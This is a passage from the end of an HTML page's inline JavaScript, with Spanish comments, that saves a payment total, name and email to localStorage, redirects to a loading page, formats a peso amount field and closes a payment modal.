        // 4. Tu respaldo en 'datosapi'
        datosapi.pago_final = {
            total: totalFinal,
            nombre: datosFormulario.nombre,
            email: datosFormulario.correo
        };
        localStorage.setItem('datosapi', JSON.stringify(datosapi));

        // 5. Redirección normal a la pantalla de carga (load.php)
        window.location.href = 'load.php';
    });
}

// Eventos de la tabla de pago
document.getElementById('valor-pago').addEventListener('keyup', (e) => {
    let n = e.target.value.replace(/\D/g, '');
    e.target.value = '$ ' + Number(n).toLocaleString('es-CO');
    actualizarResumenTotal();
});

// Cerrar modal si se hace clic fuera
window.onclick = function(event) {
    const modal = document.getElementById('modal-pago');
    if (event.target == modal) {
        modal.style.display = "none";
    }
}
</script>
</body>
</html>